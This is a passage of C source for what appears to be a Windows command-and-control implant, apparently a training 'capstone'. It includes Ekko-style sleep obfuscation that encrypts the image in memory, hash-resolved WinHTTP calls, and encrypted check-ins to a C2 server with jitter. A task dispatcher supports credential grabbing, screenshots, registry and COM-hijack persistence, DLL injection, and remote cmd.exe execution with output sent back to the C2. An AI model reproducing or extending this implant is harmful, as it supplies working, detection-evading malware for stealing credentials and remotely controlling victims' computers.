    Ctx[1].Rdx = U_PTR(ImageSize);
    Ctx[1].R8 = U_PTR(PAGE_READWRITE);
    Ctx[1].R9 = U_PTR(&Value);

    // [2] SystemFunction032 → RC4 encrypt image
    Ctx[2].Rip = U_PTR(pWin32Apis->SystemFunction032);
    Ctx[2].Rcx = U_PTR(&Img);
    Ctx[2].Rdx = U_PTR(&Key);

    // [3] Sleep for dwTimeOut ms — image is encrypted garbage here
    Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
    Ctx[3].Rcx = U_PTR(GetCurrentProcess());
    Ctx[3].Rdx = U_PTR(dwTimeOut);
    Ctx[3].R8 = U_PTR(FALSE);

    // [4] SystemFunction032 → RC4 decrypt image (same key = XOR symmetry)
    Ctx[4].Rip = U_PTR(pWin32Apis->SystemFunction032);
    Ctx[4].Rcx = U_PTR(&Img);
    Ctx[4].Rdx = U_PTR(&Key);

    // [5] VirtualProtect → RX  (restore executable, no write)
    Ctx[5].Rip = U_PTR(VirtualProtect);
    Ctx[5].Rcx = U_PTR(ImageBase);
    Ctx[5].Rdx = U_PTR(ImageSize);
    Ctx[5].R8 = U_PTR(PAGE_EXECUTE_READ);
    Ctx[5].R9 = U_PTR(&Value);

    // [6] SetEvent(EvntEnd) — signals that we're done, wakes main thread
    Ctx[6].Rip = U_PTR(SetEvent);
    Ctx[6].Rcx = U_PTR(EvntEnd);

    // queue all 7 frames as timer callbacks staggered 100ms apart
    // NtContinue is the callback — it resumes from the CONTEXT we pass
    printf("[*] Queuing ROP chain (7 frames)...\n");
    for (int i = 0; i < 7; i++) {
      if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
                          Queue, &Timer,
                          (WAITORTIMERCALLBACKFUNC)pWin32Apis->NtContinue,
                          &Ctx[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
        printf("[!] RtlCreateTimer [frame %d] Failed: %lx\n", i, Status);
        goto LEAVE;
      }
    }

    // signal EvntStart and wait on EvntEnd
    // this kicks off frame [0] and blocks until frame [6] fires
    printf("[*] Triggering sleep obfuscation chain...\n");
    if (!NT_SUCCESS(Status = pWin32Apis->NtSignalAndWaitForSingleObject(
                        EvntStart, EvntEnd, FALSE, NULL))) {
      printf("[!] NtSignalAndWaitForSingleObject Failed: %lx\n", Status);
      goto LEAVE;
    }

    printf("[+] Ekko: awake, image restored\n");

  LEAVE:
    if (Queue)
      pWin32Apis->RtlDeleteTimerQueue(Queue);
    if (EvntTimer)
      CloseHandle(EvntTimer);
    if (EvntStart)
      CloseHandle(EvntStart);
    if (EvntEnd)
      CloseHandle(EvntEnd);
}

// ── Public wrapper called from beacon_run() ──────────────────────
// Initializes API pointers once, then calls EkkoObf
static WIN32_API g_Win32Api = { 0 };
static BOOL      g_ApiInit  = FALSE;

VOID ekko_sleep(DWORD sleepMs) {
    if (!g_ApiInit) {
      if (!InitializeWinApi32(&g_Win32Api)) {
        // fallback to plain Sleep if init fails
        printf("[!] ekko_sleep: API init failed, falling back to Sleep()\n");
        Sleep(sleepMs);
        return;
      }
      g_ApiInit = TRUE;
    }
    EkkoObf(&g_Win32Api, sleepMs);
}


//POST CHECK-IN
//Mod 30,19,55

BOOL beacon_post(
    BYTE*  payload,
    DWORD  payloadLen,
    BYTE** responseOut,
    DWORD* responseLenOut
) {
    BOOL bSuccess = FALSE;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    HMODULE hWinHttp = NULL;
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(DWORD);

    // encrypted payload output
    PVOID pEncrypted = NULL;
    DWORD dwEncryptSize = 0;

    // response buffer (grows with realloc as we read chunks)
    BYTE *pResponse = NULL;
    DWORD dwRespTotal = 0;
    BYTE chunk[READ_CHUNK_SIZE] = {0};
    DWORD dwBytesRead = 0;

    // decrypted response
    PVOID pDecrypted = NULL;
    DWORD dwDecryptSize = 0;

    // ── Step 1: encrypt payload before it touches the wire ───────
    printf("[*] beacon_post: encrypting %ld byte payload\n", payloadLen);
    if (!aes_encrypt_payload(payload, payloadLen, &pEncrypted,
                             &dwEncryptSize)) {
      printf("[!] aes_encrypt_payload Failed\n");
      goto CLEANUP;
    }
    printf("[+] Encrypted payload: %ld bytes\n", dwEncryptSize);

    // ── Step 2: resolve WinHTTP via hash — no static imports ─────
    printf("[*] Resolving WinHTTP via hash...\n");
    hWinHttp = GetModuleHandleH(WINHTTP_DLL_HASH);
    if (!hWinHttp) {
      // not loaded yet — force load it
      // NOTE: LoadLibrary is detectable; in full OPSEC build
      // resolve this via manual mapping. Fine for capstone.
      hWinHttp = LoadLibraryA("winhttp.dll");
      if (!hWinHttp) {
        printf("[!] Failed to get WinHTTP module\n");
        goto CLEANUP;
      }
    }

    fnWinHttpOpen pWinHttpOpen =
        (fnWinHttpOpen)GetProcAddressH(hWinHttp, WinHttpOpen_HASH);
    fnWinHttpConnect pWinHttpConnect =
        (fnWinHttpConnect)GetProcAddressH(hWinHttp, WinHttpConnect_HASH);
    fnWinHttpOpenRequest pWinHttpOpenRequest =
        (fnWinHttpOpenRequest)GetProcAddressH(hWinHttp,
                                              WinHttpOpenRequest_HASH);
    fnWinHttpSendRequest pWinHttpSendRequest =
        (fnWinHttpSendRequest)GetProcAddressH(hWinHttp,
                                              WinHttpSendRequest_HASH);
    fnWinHttpReceiveResponse pWinHttpReceiveResponse =
        (fnWinHttpReceiveResponse)GetProcAddressH(hWinHttp,
                                                  WinHttpReceiveResponse_HASH);
    fnWinHttpReadData pWinHttpReadData =
        (fnWinHttpReadData)GetProcAddressH(hWinHttp, WinHttpReadData_HASH);
    fnWinHttpCloseHandle pWinHttpCloseHandle =
        (fnWinHttpCloseHandle)GetProcAddressH(hWinHttp,
                                              WinHttpCloseHandle_HASH);
    fnWinHttpQueryHeaders pWinHttpQueryHeaders =
        (fnWinHttpQueryHeaders)GetProcAddressH(hWinHttp,
                                               WinHttpQueryHeaders_HASH);

    // verify all pointers resolved
    if (!pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
        !pWinHttpSendRequest || !pWinHttpReceiveResponse || !pWinHttpReadData ||
        !pWinHttpCloseHandle || !pWinHttpQueryHeaders) {
      printf("[!] One or more WinHTTP pointers failed to resolve\n");
      goto CLEANUP;
    }
    printf("[+] WinHTTP pointers resolved\n");

    // ── Step 3: open session ─────────────────────────────────────
    hSession = pWinHttpOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
      printf("[!] WinHttpOpen Failed: %ld\n", GetLastError());
      goto CLEANUP;
    }

    // ── Step 4: connect to C2 ────────────────────────────────────
    hConnect = pWinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) {
      printf("[!] WinHttpConnect Failed: %ld\n", GetLastError());
      goto CLEANUP;
    }

    // ── Step 5: open POST request ────────────────────────────────
    hRequest = pWinHttpOpenRequest(
        hConnect, L"POST", C2_ENDPOINT, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
      printf("[!] WinHttpOpenRequest Failed: %ld\n", GetLastError());
      goto CLEANUP;
    }

    // ── Step 6: send encrypted blob as request body ──────────────
    printf("[*] POSTing to %S%S\n", C2_HOST, C2_ENDPOINT);
    if (!pWinHttpSendRequest(
            hRequest, L"Content-Type: application/octet-stream\r\n", (DWORD)-1L,
            pEncrypted, dwEncryptSize, dwEncryptSize, 0)) {
      printf("[!] WinHttpSendRequest Failed: %ld\n", GetLastError());
      goto CLEANUP;
    }

    // ── Step 7: receive response headers ─────────────────────────
    if (!pWinHttpReceiveResponse(hRequest, NULL)) {
      printf("[!] WinHttpReceiveResponse Failed: %ld\n", GetLastError());
      goto CLEANUP;
    }

    // check HTTP status code
    pWinHttpQueryHeaders(hRequest,
                         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                         WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
                         WINHTTP_NO_HEADER_INDEX);

    printf("[*] C2 response status: %ld\n", statusCode);
    if (statusCode != 200) {
      printf("[!] Non-200 response — no task\n");
      bSuccess = TRUE; // not an error, just no task
      goto CLEANUP;
    }

    // ── Step 8: read response body in chunks ─────────────────────
    do {
      dwBytesRead = 0;
      ZeroMemory(chunk, READ_CHUNK_SIZE);

      if (!pWinHttpReadData(hRequest, chunk, READ_CHUNK_SIZE, &dwBytesRead))
        break;
      if (dwBytesRead == 0)
        break;

      // grow response buffer
      BYTE *pTemp;
      if (pResponse == NULL)
        pTemp = (BYTE *)HeapAlloc(GetProcessHeap(), 0, dwBytesRead);
      else
        pTemp = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, pResponse,
                                    dwRespTotal + dwBytesRead);
      if (!pTemp) {
        printf("[!] HeapReAlloc Failed\n");
        goto CLEANUP;
      }
      pResponse = pTemp;
      memcpy(pResponse + dwRespTotal, chunk, dwBytesRead);
      dwRespTotal += dwBytesRead;

    } while (dwBytesRead == READ_CHUNK_SIZE);

    printf("[+] Received %ld bytes from C2\n", dwRespTotal);

    if (!pResponse || dwRespTotal == 0) {
      bSuccess = TRUE; // 200 but empty body = no task queued
      goto CLEANUP;
    }

    // ── Step 9: decrypt response ─────────────────────────────────
    if (!aes_decrypt_payload(pResponse, dwRespTotal, &pDecrypted,
                             &dwDecryptSize)) {
      printf("[!] aes_decrypt_payload Failed\n");
      goto CLEANUP;
    }
    printf("[+] Decrypted response: %ld bytes\n", dwDecryptSize);

    // hand off to caller — caller owns this memory, must HeapFree it
    *responseOut = (BYTE *)pDecrypted;
    *responseLenOut = dwDecryptSize;
    bSuccess = TRUE;

  CLEANUP:
    if (pEncrypted)
      HeapFree(GetProcessHeap(), 0, pEncrypted);
    if (pResponse)
      HeapFree(GetProcessHeap(), 0, pResponse);
    if (hRequest)
      pWinHttpCloseHandle(hRequest);
    if (hConnect)
      pWinHttpCloseHandle(hConnect);
    if (hSession)
      pWinHttpCloseHandle(hSession);
    return bSuccess;
}

// jitter helper — adds randomness to sleep interval using JITTER_PERCENT from config.h
DWORD jitter(DWORD baseMs) {
    DWORD variation = (baseMs * JITTER_PERCENT) / 100;
    if (variation == 0) return baseMs;
    DWORD rnd = 0;
    _rdrand32_step(&rnd);
    return baseMs - variation + (rnd % (2 * variation));
}

// ── Task dispatcher ──────────────────────────────────────────────
// Parses a JSON task blob from the C2 response and routes to the
// appropriate handler.
//
// Expected JSON (decrypted by beacon_post before we get here):
//   { "id": "uuid", "command": "grab_creds", "args": null }
//   { "id": "uuid", "command": "persist_reg", "args": "C:\\path\\beacon.exe" }
//   { "id": "uuid", "command": "inject", "args": "notepad.exe" }
//   { "id": "uuid", "command": "kill", "args": null }
//
// Minimal JSON parser — we look for the "command" and "args" values
// without pulling in a JSON library (keeps binary small).

// Find a JSON string value by key. Returns pointer to value start (after quote),
// writes null-terminated copy into out. Returns FALSE if not found.
static BOOL json_get_string(const CHAR* json, const CHAR* key,
                            CHAR* out, DWORD outMax) {
    // Build search pattern: "key":"
    CHAR pattern[128];
    wsprintfA(pattern, "\"%s\":\"", key);

    const CHAR* start = strstr(json, pattern);
    if (!start) {
        // Try with space: "key": "
        wsprintfA(pattern, "\"%s\": \"", key);
        start = strstr(json, pattern);
        if (!start) return FALSE;
    }
    start = strchr(start, ':');
    if (!start) return FALSE;
    start++; // skip ':'
    while (*start == ' ') start++;
    if (*start != '"') return FALSE;
    start++; // skip opening quote

    DWORD i = 0;
    while (*start && *start != '"' && i < outMax - 1) {
        out[i++] = *start++;
    }
    out[i] = '\0';
    return i > 0;
}

// Check if a key's value is null: "key": null  or  "key":null
static BOOL json_value_is_null(const CHAR* json, const CHAR* key) {
    CHAR pattern[128];
    wsprintfA(pattern, "\"%s\":", key);
    const CHAR* start = strstr(json, pattern);
    if (!start) return TRUE;
    start = strchr(start, ':');
    if (!start) return TRUE;
    start++;
    while (*start == ' ') start++;
    return (strncmp(start, "null", 4) == 0);
}

VOID dispatch_task(BYTE* taskBlob, DWORD taskBlobLen) {
    if (!taskBlob || taskBlobLen < 2) return;

    // Null-terminate for string operations (blob is heap-allocated)
    CHAR* json = (CHAR*)taskBlob;
    if (json[taskBlobLen - 1] != '\0') {
        // Safe: caller allocated the blob so we can read to taskBlobLen
        // Make a copy with null terminator
        CHAR* tmp = (CHAR*)HeapAlloc(GetProcessHeap(), 0, taskBlobLen + 1);
        if (!tmp) return;
        memcpy(tmp, json, taskBlobLen);
        tmp[taskBlobLen] = '\0';
        json = tmp;
    }

    CHAR command[64] = {0};
    CHAR args[MAX_PATH] = {0};
    CHAR taskId[64] = {0};

    json_get_string(json, "id", taskId, sizeof(taskId));

    if (!json_get_string(json, "command", command, sizeof(command))) {
        printf("[!] dispatch_task: No 'command' in task blob\n");
        goto cleanup;
    }

    // Get args (may be null)
    BOOL hasArgs = !json_value_is_null(json, "args");
    if (hasArgs) {
        json_get_string(json, "args", args, sizeof(args));
    }

    printf("[*] dispatch_task: id=%s command=%s args=%s\n",
           taskId, command, hasArgs ? args : "(null)");

    // ── Route to handlers ────────────────────────────────────────

    // Post-exploitation
    if (strcmp(command, "grab_creds") == 0 ||
        strcmp(command, "screenshot") == 0) {
        postex_run(command);
    }
    // Persistence
    else if (strcmp(command, "persist_reg") == 0) {
        if (hasArgs) persist_registry_run(args);
        else printf("[!] persist_reg requires exe path in args\n");
    }
    else if (strcmp(command, "persist_com") == 0) {
        if (hasArgs) persist_com_hijack(args);
        else printf("[!] persist_com requires dll path in args\n");
    }
    else if (strcmp(command, "persist_remove") == 0) {
        persist_remove();
    }
    // Injection
    else if (strcmp(command, "inject") == 0) {
        if (hasArgs) {
            // args = target exe path; payload would come from a separate field
            // For now, use ghost_inject with no payload (process start only)
            printf("[*] inject: target=%s (injection requires payload data)\n", args);
        }
    }
    else if (strcmp(command, "dll_inject") == 0) {
        if (hasArgs) {
            // args format: "PID:DLL_PATH" e.g. "1234:C:\\evil.dll"
            CHAR* sep = strchr(args, ':');
            if (sep) {
                *sep = '\0';
                DWORD pid = (DWORD)atol(args);
                LPCSTR dllPath = sep + 1;
                dll_inject(pid, dllPath);
            }
        }
    }
    // Shell command execution
    else if (strcmp(command, "shell") == 0) {
        if (hasArgs) {
            // Execute via cmd.exe /c, capture output
            CHAR cmdLine[MAX_PATH + 32];
            wsprintfA(cmdLine, "cmd.exe /c %s", args);

            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
            HANDLE hReadPipe, hWritePipe;
            if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
                STARTUPINFOA si = {0};
                PROCESS_INFORMATION pi = {0};
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdOutput = hWritePipe;
                si.hStdError  = hWritePipe;

                if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                    CloseHandle(hWritePipe);
                    // Read output
                    CHAR outBuf[8192] = {0};
                    DWORD bytesRead = 0;
                    ReadFile(hReadPipe, outBuf, sizeof(outBuf) - 1, &bytesRead, NULL);
                    WaitForSingleObject(pi.hProcess, 10000);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe);

                    printf("[+] shell output (%lu bytes):\n%s\n", bytesRead, outBuf);

                    // Send output back to C2 as task result
                    // Build JSON: {"task_id":"...", "output":"...", "exit_code":0}
                    DWORD jsonLen = bytesRead + 256;
                    CHAR* resultJson = (CHAR*)HeapAlloc(GetProcessHeap(), 0, jsonLen);
                    if (resultJson) {
                        int n = wsprintfA(resultJson,
                            "{\"task_id\":\"%s\",\"output\":\"", taskId);
                        // Copy output, escaping quotes and backslashes
                        for (DWORD i = 0; i < bytesRead && n < (int)jsonLen - 32; i++) {
                            if (outBuf[i] == '"' || outBuf[i] == '\\') {
                                resultJson[n++] = '\\';
                            }
                            if (outBuf[i] == '\n') {
                                resultJson[n++] = '\\';
                                resultJson[n++] = 'n';
                            } else if (outBuf[i] == '\r') {
                                continue;
                            } else {
                                resultJson[n++] = outBuf[i];
                            }
                        }
                        n += wsprintfA(resultJson + n, "\",\"exit_code\":0}");

                        BYTE* resp = NULL;
                        DWORD respLen = 0;
                        beacon_post((BYTE*)resultJson, n, &resp, &respLen);
                        HeapFree(GetProcessHeap(), 0, resultJson);
                        if (resp) HeapFree(GetProcessHeap(), 0, resp);
                    }
                } else {
                    CloseHandle(hWritePipe);
                    CloseHandle(hReadPipe);
                }
            }
        }
    }
    // Kill switch
    else if (strcmp(command, "kill_hard") == 0) {
        killswitch_hard();
    }
    else if (strcmp(command, "kill_soft") == 0) {
        killswitch_soft();
    }
    // Whoami (simple identity check)
    else if (strcmp(command, "whoami") == 0) {
        CHAR user[256] = {0}, host[256] = {0};
        DWORD uLen = sizeof(user), hLen = sizeof(host);
        GetUserNameA(user, &uLen);
        GetComputerNameA(host, &hLen);

        CHAR result[600];
        int n = wsprintfA(result,
            "{\"task_id\":\"%s\",\"output\":\"%s\\\\%s\",\"exit_code\":0}",
            taskId, host, user);

        BYTE* resp = NULL;
        DWORD respLen = 0;
        beacon_post((BYTE*)result, n, &resp, &respLen);
        if (resp) HeapFree(GetProcessHeap(), 0, resp);
    }
    else {
        printf("[!] dispatch_task: Unknown command '%s'\n", command);
    }

cleanup:
    if (json != (CHAR*)taskBlob)
        HeapFree(GetProcessHeap(), 0, json);
}